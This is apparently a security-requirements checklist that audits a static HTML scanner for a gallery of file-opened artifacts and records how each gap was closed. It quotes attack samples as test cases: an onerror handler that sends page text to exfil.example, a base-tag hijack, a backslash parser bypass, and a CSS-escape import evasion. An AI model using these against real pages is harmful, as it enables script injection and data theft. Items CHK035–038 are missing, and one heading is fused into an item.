# Security Requirements Quality Checklist: Artifact Brand Kit & Gallery Foundation

**Purpose**: Validate that the security-relevant requirements in `spec.md` and
`plan.md` (read together with `research.md`, `data-model.md`, and both
`contracts/` files) are complete, unambiguous, internally consistent, and
objectively verifiable — before a scanner design, an inline-script snippet, and
a licensing gate are frozen into a contract that four port specs and three
workflow specs inherit.
**Created**: 2026-07-28
**Feature**: [spec.md](../spec.md)

**Depth**: formal release gate. **Audience**: PR reviewer.

**Why this domain carries unusual weight here**: gallery artifacts are
**executable documents**. They ship inline script, they are opened from
`file://` by a human reviewing a pull request, and later specs will generate
them from repository content. The brand kit and the theme toggle are embedded
**verbatim into 21 templates**, so a defect in either has no per-template fix —
it is a defect in all 21 at once. FR-011's scanner is the only automated control
over what an artifact may reach, and ART-001 ships **zero** artifacts, so every
artifact-conditioned check is vacuously true at merge. A hole in the
*requirement* cannot be caught by the *data* until a later spec has already
built on it.

**Verification method**: no claimed parsing behaviour was accepted as written.
Every assertion below about HTML attribute handling, `html.parser` output, CSS
`url()` / `@import` matching, `srcset` splitting, and URL host extraction was
executed against Python 3.11.0 (the version the constitution pins) and is
reported with its observed result. Browser-side and standards claims were then
checked against the WHATWG HTML and URL standards, CSS Syntax Level 3, CSS
Cascade Level 5, and W3C CSP Level 3. **Two items were corrected by that second
pass and are marked `[Overclaim → Corrected]`** — the remediation states what is
actually true rather than what the first pass asserted. Repository runner
behaviour was read from `speckit-pro/speckit_pro_runner/gates/payloads.py`
rather than inferred from prose.

## Threat Model — Is There One?

- [x] CHK001 - Do the requirements state **what FR-011 defends against and from whom**, so the completeness of its position list can be judged? FR-011, SC-008, and `research.md` R6 all described the rule ("only the two font hosts, only in resource-loading positions") but never the property being protected, conflating *offline readability and review privacy* with *evasion resistance* — the first satisfied by a short enumeration, the second not, and the check inventory written in the register of the second. [Gap → Resolved] [Spec §FR-011; research.md R6] **Resolved:** FR-011 now opens with "What this defends, and what it does not", names both properties, claims only the first as a guarantee, pursues the second as far as a static check reaches, and records the residual plainly — a determined author with commit access defeats any check in this repository, and review is the control that binds them.
- [x] CHK002 - Is the scanner's **scope limit** stated where a reader of the requirements would see it? The contract said "source only", but FR-011 said "every gallery artifact" and SC-008 claimed coverage "across the entire gallery", so a port or workflow author would reasonably conclude that run-time-generated artifacts inherit the guarantee. They do not, and nothing ever will scan them. [Gap → Resolved] [Spec §FR-011, §SC-008] **Resolved:** the limit is now stated in four places a consumer actually reads — FR-011's "Scope is the source tree" paragraph, SC-008's closing sentence, a new Assumptions entry, and a dedicated section at the top of the validation contract. Each says the same thing: reading SC-008 as covering generated output means relying on a guarantee that was never made.
- [x] CHK003 - Are the requirements explicit that a scanner over a fixed position list is a **denylist**, and that its guarantee is bounded accordingly? The inventory honestly said "Positions scanned, and **only** these", but no requirement drew the consequence: anything unenumerated is permitted by construction. [Gap → Resolved] [contracts/gallery-validation-contract.md Group E] **Resolved:** rather than documenting the denylist, FR-011 **inverts** it — see CHK005. The consequence is now stated as the reason for the inversion rather than as a caveat on a design that keeps it.

## Scanner Position Coverage — Completeness of FR-011's Enumeration

- [x] CHK004 - Does the position list account for `<base href>`, which **redefines resolution for every relative URL in the document**? It appeared nowhere in the spec, plan, research, or check inventory. This is not one more missing position; it is a complete bypass. An artifact with all-relative references — the shape the single-file contract encourages — plus one `<base href="https://attacker.example/">` contains **no foreign host in any scanned position** while loading everything from the attacker. Confirmed against the WHATWG HTML Standard: a document has exactly one base URL (§2.4.3), supplied by the first `base` element with an `href`, and the spec's shared URL-resolution machinery draws on it; the technique is documented externally as "base tag hijacking". [Gap → Resolved] [Spec §FR-011] **Resolved:** new **FR-027** prohibits the construct outright and check **J1** enforces it. Prohibition is the only available fix — group E asks "is this host allowed" and a base element carries no host at all, so no amount of host checking can see it. Recorded in the plan's risk table as its own row.
- [x] CHK005 - Does the position list cover the media and embedding elements? Executed against `html.parser`: `<source src>`/`<source srcset>`, `<video src>`, `<video poster>`, `<audio src>`, `<track src>`, `<object data>`, `<embed src>`, `<input type="image" src>`, and SVG `<image href>`/`<use href>` each parse to a start tag carrying a live resource URL, and **none** was in the scanned set — which named `src` on exactly three elements. [Gap → Resolved] [Spec §FR-011] **Resolved:** FR-011 replaces the enumeration with **default-deny over every URL-valued attribute**, carrying instead a closed *exemption* list (anchor `href`, parser-recognized comments, visible text). An attribute the scanner does not recognize now **fails** rather than passing, so a position nobody anticipated is reported instead of admitted. This single inversion closes CHK005 through CHK009 together and is the load-bearing change of this checklist.
- [x] CHK006 - Does the `link` position cover the `rel` values that actually fetch? The rule scanned `href` on `link` only where `rel` was a stylesheet or preconnect relation. [Gap → Resolved] [Spec §FR-011] **Resolved by the CHK005 inversion** — `link href` is now scanned regardless of `rel`, so the filter is gone rather than widened. **The supporting claim was also corrected on review**: the first pass asserted "at least nine fetching relations". Per the WHATWG link-types table, six fetch a resource — `stylesheet`, `preload`, `modulepreload`, `prefetch`, `icon`, `manifest`, with `preload`/`modulepreload` fetching **and executing** — while `preconnect` and `dns-prefetch` fetch nothing but still contact the host. FR-011 and the contract now state it that way, and note that the contact-without-fetch pair is exactly why a fetch-only reading would not serve the privacy property FR-011 protects.
- [x] CHK007 - Is the `rel` comparison specified in a way that survives the attribute's real syntax? Executed: `html.parser` returns `rel` **case-preserved**, so `rel="STYLESHEET"` and `rel="Stylesheet"` both fail exact equality against `"stylesheet"`, and the ordinary `rel="preconnect stylesheet"` fails it too — the attribute being a space-separated set of ASCII case-insensitive keywords (WHATWG HTML §4.6.2). The filter was leaky and brittle in opposite directions at once. [Gap → Resolved] [contracts/gallery-validation-contract.md Group E] **Resolved by the CHK005 inversion**: with no `rel` filter there is no case or tokenisation question to get wrong. Recorded because the reflex fix — casefold and tokenise the `rel` value — would have preserved the leak in CHK006 while removing only the brittleness.
- [x] CHK008 - Are the exfiltration-shaped positions covered — the ones that send rather than fetch? `<form action>`, `<a ping>`, and `<meta http-equiv="refresh">` were all unscanned. `ping` is the sharpest: per WHATWG HTML §4.6.7 it issues a `POST` with `Content-Type: text/ping`, and it rides the **`<a>` element that E2 exempted wholesale**. [Gap → Resolved] [Spec §FR-011; contracts/gallery-validation-contract.md E2] **Resolved:** covered by the CHK005 inversion for scanning, and additionally prohibited outright by **FR-027 / J5** (no form target, no `ping` on any element), because both send rather than fetch and a self-contained artifact needs neither. Verified support detail worth recording for the port specs: `ping` is on by default in Chrome, Safari, and Edge, and **off by default in Firefox** (`browser.send_pings`) — so the exposure is real but not universal.
- [x] CHK009 - Are inline event handlers and `<iframe srcdoc>` addressed? Executed: `<img src=x onerror="fetch('https://exfil.example/'+document.body.innerText)">` parses to an ordinary `img` whose `src` is the innocuous `x` — the allowlist sees a local reference and passes — while the network destination sits in an `on*` attribute the position list did not name. `srcdoc` parses to a complete HTML document string carrying its own script. [Gap → Resolved] [Spec §FR-011] **Resolved:** **FR-027 / J3 and J4** prohibit both outright, and FR-011's network-call scan now explicitly covers attribute values (CHK010), so the two mechanisms are independent.
- [x] CHK010 - Where the network-call scan applies is unstated. The inventory listed `fetch(...)`, `XMLHttpRequest.open(...)`, and `new WebSocket(...)` "string literals" without saying whether the scan covered only `<script>` content or the whole document — which decides whether CHK009's `onerror` case is caught, and whether `sendBeacon`, `Worker`, `EventSource`, `importScripts`, and dynamic `import()` matter. [Gap → Resolved] [contracts/gallery-validation-contract.md Group E] **Resolved:** the contract now states the scan runs over **the whole document text, including attribute values**, and extends the call list to `navigator.sendBeacon(...)`, `new Worker(...)`, `new EventSource(...)`, `importScripts(...)`, and dynamic `import(...)`. This also closes CHK044's traceability gap, where FR-011's "network-request destinations written into the file" was broader than the three literals the check named.

## Host Matching and URL Normalization

- [x] CHK011 - Is the **host extraction method** specified, or only the comparison? E1 said "Every host in a scanned position ∈ {…}" and stopped; whether the host came from a structured parser or a regular expression — the difference between a sound check and a bypassable one — was left to the implementer. [Gap → Resolved] [Spec §FR-011] **Resolved:** FR-011 pins a structured URL parser and, better, **directs reuse of hardening this repository already owns** rather than inventing a rule: `_openai_url` in `tests/speckit-pro/layer6-efficiency/lib/codex_capability_contract.py` asserts a conjunction including canonical round-trip (`geturl() == value`), `username is None`, `password is None`, and `port is None`; `_validated_http_url` in `scripts/release_note_policy.py` rejects control, whitespace, and delimiter characters before parsing. Checks E5 and E6 are those two patterns. Neither was written for this feature; both were written for this class of problem.
- [x] CHK012 - Are the **lookalike-host** forms excluded by a stated rule? Executed: `https://fonts.googleapis.com.evil.example/x` yields hostname `fonts.googleapis.com.evil.example` and `https://evil.example/fonts.googleapis.com/x` yields `evil.example` — both correctly rejected by exact set membership, both accepted by any substring test. The word "exactly" appeared in the checklist request but in neither FR-011 nor E1. [Gap → Resolved] [Spec §FR-011] **Resolved:** FR-011 and E1 now require **exact case-folded equality**, never containment or prefix, and E1's failure column names the lookalike form a substring match would admit.
- [x] CHK013 - Is host **normalization** defined before comparison? Executed: `https://fonts.googleapis.com./css2` yields hostname `fonts.googleapis.com.` — trailing root dot preserved. Browsers resolve it to the same host; exact equality rejects it. It fails *closed*, so it was a false positive rather than a hole, but it was undefined behaviour in a rule called exact. [Gap → Resolved] [Spec §FR-011] **Resolved:** FR-011 now states the normalization explicitly and fixes the direction — a trailing root dot **fails** — and records *why* it is written down despite being the safe direction: an implementer meeting it as a false positive might loosen the comparison to admit it, "which is precisely how an exact match becomes a suffix match." E1 carries the same note.
- [x] CHK014 - Is there a **scheme** rule, given that a host-based allowlist cannot see a URL that has no host? Executed: `urlparse("javascript:alert(1)").hostname` and the same for a `data:` URL both return `None`, so whether such a reference failed or was silently skipped depended on an implementation detail no requirement fixed. `<iframe src="data:text/html,…">` runs attacker script in an opaque origin, and E2 as written exempted `<a href="javascript:…">` outright. [Gap → Resolved] [Spec §FR-011; contracts/gallery-validation-contract.md E2] **Resolved:** FR-011 adds a scheme rule — in a resource-loading position only `https:` and same-document relative references are permitted (E7) — and additionally prohibits `javascript:` and `data:` **in the exempted anchor position**, on the stated ground that the exemption exists to keep ordinary provenance links passing and nothing about that purpose requires admitting script execution. The repository's existing unsafe-scheme corpus in `tests/speckit-pro/unit/test-release-note-policy.py` already covers `javascript:`, mixed-case `JaVaScRiPt:`, `data:text/html`, `vbscript:`, the scheme-relative form, and the backslash form; FR-011 directs reuse rather than a second corpus that would drift.
- [x] CHK015 - Is the behaviour on an **unparseable or host-less** reference specified as a failure? No requirement stated the fail-closed direction, so a scanner iterating over successfully-extracted hosts would silently skip precisely the set an evader controls. [Gap → Resolved] [Spec §FR-011] **Resolved:** FR-011 states "Failure MUST be the default on anything not understood", and check **E8** makes an unparseable or host-less reference in a scanned position a failure.
- [x] CHK016 - Is the **scanner-versus-browser parser differential** acknowledged? Executed rather than argued: for `https://evil.example\@fonts.googleapis.com/x.css`, Python 3.11.0's `urlparse(...).hostname` returns **`fonts.googleapis.com`** and the reference passes; the WHATWG URL Standard treats `\` as equivalent to `/` in a special-scheme authority, terminating it at `evil.example`, so a **browser loads from `evil.example`**. A correct, structured-parser implementation of E1 therefore still admitted this. [Gap → Resolved] [Spec §FR-011] **Resolved:** FR-011 carries this as its own paragraph — "The checking parser and the executing parser can disagree, and the requirement MUST NOT assume otherwise" — and requires rejection, **before parsing**, of any reference containing a backslash, whitespace, a control character, or a character outside the unreserved URL grammar. Check **E6**. This is the pre-parse rejection `scripts/release_note_policy.py` already performs, applied here for the reason that makes it load-bearing rather than decorative.
- [x] CHK017 - Are **protocol-relative** references addressed? Executed: `urlparse("//evil.example/x.js")` yields scheme `''` and hostname `evil.example`, so a structured parser sees it — but a pattern keyed on `https?://` does not, and the style positions are regex-scanned. [Gap → Resolved] [Spec §FR-011] **Resolved:** prohibited outright by **FR-027 / J2** and check **E12**, on two verified grounds that do not depend on the disputed one: the form names a foreign host the document resolves against, and it is invisible to any explicit-scheme pattern. See CHK028 for the `file://` consequence and the claim that was pared back.
- [x] CHK018 - Is a non-default **port** on an allowlisted host constrained? `https://fonts.googleapis.com:8443/` extracts hostname `fonts.googleapis.com` and passed — a small but unstated degree of freedom in a rule presented as closed. [Gap → Resolved] [contracts/gallery-validation-contract.md E1] **Resolved:** check **E5** requires `port is None`, inherited directly from the repository's existing `_openai_url` conjunction rather than added as a bespoke rule.

## Encoding-Based Evasion

- [x] CHK019 - Are HTML **character references** in attribute values an evasion path? **Pass — and the requirements were safe here by accident rather than by statement.** Executed: `<img src="&#104;ttps://evil.example/x.png">`, `<img src="&#x68;ttps&#58;//evil2.example/y.png">`, and `<script src="ht&#116;ps://evil3.example/z.js">` all parse to fully decoded absolute URLs under `html.parser`, so entity encoding does **not** evade an `html.parser`-based element scan. Recorded because it is the evasion a reviewer is most likely to assume works, and because the guarantee comes from the parser choice — which CHK011 showed was unstated. The contract now states it under "Parsing strength is not uniform", so the property is documented rather than incidental. [Clarity] [Spec §FR-011]
- [x] CHK020 - Are **CSS escape sequences** an evasion path? Executed against all three patterns a straightforward implementation would use — a `url()` matcher, an `@import url(...)` matcher, and a generic `https?://` host scan — the input `@import "\68 ttps://evil.example/a.css";` is matched by **none of the three**. Confirmed against CSS Syntax Level 3: `\` triggers "consume an escaped code point" inside both string tokens and url tokens, decoding happens **during tokenization**, and the trailing space is consumed as the escape terminator — so by the time `@import` sees the value it is literally `https://evil.example/a.css`. A working bypass of the CSS half of the scanner. [Gap → Resolved] [Spec §FR-011] **Resolved:** check **E10** makes **any escape sequence** inside a style resource or import reference a **failure**, and FR-011 states the reasoning: a gallery artifact has no legitimate reason to escape a URL, so rejecting the construct is simpler and stronger than reproducing a browser's decoder in a regular expression.
- [x] CHK021 - Does the `@import` rule cover **both** of its syntactic forms? Executed: `@import "https://evil.example/a.css";` produces **no match** from an `@import url(...)` pattern. Confirmed against CSS Cascade Level 5, whose grammar is `@import [ <url> | <string> ]` with the explicit equivalence "If a `<string>` is provided, it must be interpreted as a `<url>` with the same value" — so both forms fetch. Only a generic host scan caught the string form, and a generic host scan is what E3 forbids. [Gap → Resolved] [contracts/gallery-validation-contract.md Group E] **Resolved:** FR-011 requires both forms be recognized and check **E9** names the bare-string form specifically.
- [x] CHK022 - Are the `url()` token's **surface variations** specified? Executed: quoted, unquoted, uppercase `URL(`, internal-whitespace, and embedded-newline forms are in fact **all matched** by a straightforward case-insensitive pattern, so this is a specification gap rather than a demonstrated bypass — a pattern written *without* those tolerances would silently miss ordinary CSS. Separately, `@namespace svg "https://…"` matches a generic host scan while initiating no fetch. [Gap → Resolved] [Spec §FR-011] **Resolved:** the contract now states what the pattern must be — case-insensitive, tolerating whitespace and newlines, with or without quotes — and explicitly labels it "a statement of what the pattern must be rather than a defect found", so a later reader does not mistake it for a closed hole. The `@namespace` false positive is recorded alongside the CSS-comment one under scan scope (CHK024).
- [x] CHK023 - Is `srcset` **candidate splitting** specified? Neither the spec nor the inventory said which algorithm applied, nor that **every** candidate is scanned rather than the first. [Overclaim → Corrected] [Spec §FR-011] **Corrected, then resolved.** The first pass asserted that naive comma splitting was an evasion, citing executed output where `srcset="data:image/png;base64,iVBORw0KGgo= 1x, //evil2.example/c.png 2x"` fragments into three bogus tokens. Checking the WHATWG "parse a srcset attribute" algorithm shows the framing was wrong: each candidate's URL is collected as *a run of characters that are not ASCII whitespace*, so a comma **inside** a URL is not a separator at all — only a trailing comma immediately before whitespace is consumed as one, and base64 contains no comma. Re-reading the executed output confirms the correction: in every case tried, naive splitting produced garbage tokens but still **surfaced** the foreign host rather than hiding it. The honest finding is a correctness defect — an unreliable candidate list in a position that can carry several references — not a bypass. **Resolved on that basis:** FR-011 and check **E11** fix the algorithm and require every candidate be scanned, and both the requirement and the contract note say plainly that this is stated as a correctness rule "rather than claiming an evasion that was not reproduced."
- [x] CHK024 - Is the scan of a `<style>` element or `style` attribute distinguished from a scan of the whole file? Executed: `html.parser` surfaces `<style>` content as a data node in which a live `@import` and a commented-out one are indistinguishable without CSS-aware parsing. Which scope applies changes both the false-positive and false-negative profile, and was unstated. [Gap → Resolved] [contracts/gallery-validation-contract.md Group E] **Resolved:** the contract states the style patterns run over the **whole document text**, and records both consequences rather than only the convenient one — a URL inside a **CSS** comment is scanned and will fail (over-strict, not unsafe; an author needing a prose URL writes it in an HTML comment, which E3 exempts), and `@namespace` is matched while fetching nothing. This is also why E10 and E12 are prohibitions rather than parses: neither position has a standard-library parser to be scoped by.

## Negative Controls — Where the Exemptions Become the Attack Surface

- [x] CHK025 - Is the `<a href>` exemption **bounded by scheme**? E2 read "Navigation `<a href>` to any host passes" and was asserted as a negative control that must not fail — which taken literally exempted `javascript:`, `data:`, and `vbscript:`, none of which are navigation to a host in any meaningful sense. [Gap → Resolved] [contracts/gallery-validation-contract.md E2] **Resolved:** E2 is now scheme-bounded — it passes for `https:`, `mailto:`, and fragment schemes, and **must fail** on `javascript:`, `data:`, `vbscript:`, and `blob:` in that same position. The exemption still protects every provenance and attribution link FR-012 and FR-020 require, because those are ordinary `https:` links.
- [x] CHK026 - Is "in a comment or in visible text" defined by **what the parser classifies**, or by a text region a pattern strips? Load-bearing in both directions and unstated. Executed: `html.parser` reports `<!-- … -->` as a comment, but content inside `<script>` — including a `<!-- … -->` sequence written within it — is reported as **script data, not a comment**, because script content is raw text. [Gap → Resolved] [contracts/gallery-validation-contract.md E3] **Resolved:** FR-011 and E3 now specify **parser-recognized** comments, and both state the consequence explicitly: an implementation that strips comment-shaped regions with a pattern *before* parsing would blind itself to live script, while a parser-driven one does not.
- [x] CHK027 - Are E2 and E3 recognised in the requirements as **security-relevant exemptions** rather than only as false-positive guards? Both were justified solely by the need to keep attribution links passing. That justification is correct and the exemptions are necessary — but an exemption in a security control is also an evasion surface, and no requirement acknowledged the trade. [Gap → Resolved] [research.md R6; Spec §FR-011] **Resolved:** FR-011 carries a paragraph titled "The exemptions are part of the attack surface and MUST be scoped as such", which keeps both exemptions, states why they are necessary, and states that they are where an evader will aim — the framing that makes CHK025's and CHK026's bounds follow rather than look arbitrary.

## `file://` Execution Context

- [x] CHK028 - Do the requirements address what a `file://` document can reach that an `https://` one cannot? The spec treated `file://` purely as a *constraint to render under* and never as a *privilege context*. [Overclaim → Corrected] [Spec §FR-011, Story 3; research.md R7] **Corrected, then resolved.** The first pass asserted that a scheme-relative reference "triggers an authenticated connection" on Windows. The URL half is confirmed — per the WHATWG URL Standard's file-host state, `//host/x` against a `file:` base produces `file://host/x` with `host` as a real host component, the network-share form. The **credential-disclosure half was not confirmed end-to-end** for an unsaved, locally-opened document with no user gesture; it is a known issue class for that URL shape, but the closest on-point source requires a prior save step. The requirement no longer rests on it. **Resolved:** a new Assumptions entry states the local-file scheme is a privilege context with three consequences — no response header can reach the document, so an in-document declaration is the only policy channel and it cannot carry framing, sandbox, or reporting directives; the scheme-relative form resolves to the network-share shape with an attacker-named host, with the disclosure outcome explicitly **not** asserted; and local storage for local files is not partitioned per file in every browser. FR-027's J2 prohibition rests only on the two verified properties.
- [x] CHK029 - Is any **defence-in-depth** control for the executable-document surface either adopted or explicitly declined with a reason? Neither — it was simply absent, so no reviewer could tell whether it had been considered. [Gap → Resolved] [Spec §FR-010; plan.md Risks] **Resolved, with one sub-decision deferred.** **FR-027 / J6** requires every artifact to carry an in-document policy declaration restricting base URI, form submission, embedded objects, nested documents, and outbound connections — the positions CHK004, CHK008, and CHK010 show a static scan cannot see. The directive set is deliberately narrow and chosen so nothing the gallery legitimately does is restricted; it is stated as **layered behind group E, not a replacement**, since J1–J5 and E1–E12 fail independently. Confirmed against CSP Level 3 that in-document delivery cannot carry `frame-ancestors`, `report-uri`, `sandbox`, or Report-Only mode, and the contract says so rather than over-promising. **Deferred:** *where* the declaration lives — reusing the theme-toggle block versus minting a third canonical marked block — is recorded in `plan.md` as an open placement decision with the cost of each. See "Unresolved for consensus".
- [x] CHK030 - Is the **`localStorage` origin model** on `file://` stated, given the toggle both writes and reads there? `research.md` R7 covered only the *refusal* case (some browsers throw, hence the `try`/`catch`) and not the opposite one. [Gap → Resolved] [research.md R7; data-model.md Entity 5] **Resolved:** the new Assumptions entry states that local storage for local files is not partitioned per file in every browser — one scopes it by **containing directory**, so a document sitting beside an artifact shares its storage — which makes the stored value untrusted input to all 21 artifacts. The wording is deliberately hedged to what is verifiable: directory scoping is confirmed for one engine; broader cross-document sharing is reported for another but its current status could not be confirmed, so no requirement depends on that stronger reading. FR-004's validation holds either way.

## Executable Documents Generated From Untrusted Input

- [x] CHK031 - Do the requirements constrain what happens when an artifact is **generated from repository content**? Searched across `spec.md`, `plan.md`, `research.md`, `data-model.md`, `quickstart.md`, and both contracts: `sanitiz`, `escape` (in the output-encoding sense), `untrusted`, `inject`, `XSS`, and `CSP` appeared **zero** times. The gallery's whole purpose is artifacts an authoring agent produces from pull-request material, interpolated into a document that ships inline `<script>` and is opened by a human. [Gap → Resolved] [Spec §FR-010] **Resolved:** **FR-027** carries a "Generated artifacts and untrusted input" section requiring the shipped contract document to state that such values are escaped for the context they enter, and **FR-010** now lists that obligation among the contract's required contents — which is what makes it reach all four port specs *and* the workflow specs, the only consumers of this feature that would otherwise never encounter it.
- [x] CHK032 - Is it stated that FR-011's guarantee **does not transfer** to generated artifacts? The compounding half of CHK031 and CHK002: without it, the untrusted-input problem was not merely unaddressed but actively masked by a guarantee that appeared to cover it. [Gap → Resolved] [Spec §SC-008, §FR-011] **Resolved:** stated in FR-011, SC-008, the new Assumptions entry, and the validation contract, and **SC-012** makes it a measurable outcome — the contract must state the limit "in the same place" as the obligation, so the obligation cannot be read as already discharged.
- [x] CHK033 - Is there a requirement that the contract document name the **contexts** interpolation may and may not target? An authoring agent told only to "escape your input" will HTML-escape a value and drop it into a `<script>` string, where HTML escaping does nothing. [Gap → Resolved] [Spec §FR-010] **Resolved:** FR-027 enumerates the four contexts an interpolated value may **never** enter — script bodies, style bodies, URL-valued attributes, and event-handler attributes — and states why a flat prohibition beats a per-context escaping rule: "the common failure is not the absence of escaping but escaping for the wrong context."

## Attribution as a Trust Signal (FR-020)

- [x] CHK034 - Can the attribution header assert something **false** and still pass validation? Yes. G3 required the header to *contain* an upstream repository, file, copyright line, license identifier, license link, and modified-derivative statement — every element checked for **presence**, none for **agreement with the entry that declares the provenance**. A header naming a different upstream file than its entry's `source.file` satisfied G3 exactly. The catalog and the header are the only two places provenance is asserted and nothing joined them. [Gap → Resolved] [Spec §FR-020; contracts/gallery-validation-contract.md G3] **Resolved:** FR-020 gains "Presence is not provenance: the header MUST agree with the entry that declares it", and new checks **G6** and **G7** require the header's named upstream file to equal `source.file` and its named repository to equal the single repository the contract names. ## Theme Toggle — Persistence and Injection

- [x] CHK039 - Is the stored theme value **validated against a closed set on read**? `data-model.md` Entity 5 said the snippet "reads a stored override, falling back to the OS signal" and specified nothing about the value's shape. With CHK030's origin model, an arbitrary attacker-chosen string can be returned and applied — and the snippet is embedded **verbatim into all 21 artifacts**, so this is decided once, for everything, with no per-template correction possible. [Gap → Resolved] [data-model.md Entity 5; Spec §FR-004] **Resolved:** FR-004 gains "The stored override is untrusted input and MUST be treated as such", requiring validation against the closed two-member set on **read**, with anything else discarded and the OS signal used as though no override existed. Critically it also requires that what is applied is **a literal from that set rather than the string that was read** — which is what makes the closed set enforcing rather than decorative. Check **I5** asserts the validation sits inside the copied region.
- [x] CHK040 - Is the snippet constrained never to place the stored value into a **markup or selector context**? FR-022 requires the control to reflect the current theme in its accessible name and state — exactly the string-building that invites interpolation. [Gap → Resolved] [Spec §FR-004, §FR-022] **Resolved:** FR-004 states the value "MUST NOT be interpolated into markup, into a selector, or into any other executable context". Consistent with FR-027's generated-artifact rule, so the shared snippet and the port specs inherit one principle rather than two.
- [x] CHK041 - Is the **storage key** specified? An unnamespaced key maximises collision in both directions with any other local document sharing the partition, and the key was fixed nowhere, so 21 artifacts would inherit whatever the first implementation chose. [Gap → Resolved] [data-model.md Entity 5] **Resolved:** FR-004 requires the key be namespaced to this gallery, and check **I6** asserts it sits inside the copied region.
- [x] CHK042 - Is the `try`/`catch` requirement stated so it cannot become a **silent swallow**? FR-004's "without surfacing an error" and R7's throwing-browser case are both sound; the residual risk was that a `catch` written to satisfy the first also swallows faults on the read path, which is where CHK039's validation must run. [Clarity] [Spec §FR-004] **Addressed rather than loosened:** FR-004 now states that the `try`/`catch` "MUST NOT be the mechanism that satisfies this", keeping the two obligations separate so an empty `catch` cannot discharge both. `data-model.md` Entity 5 carries the same note.
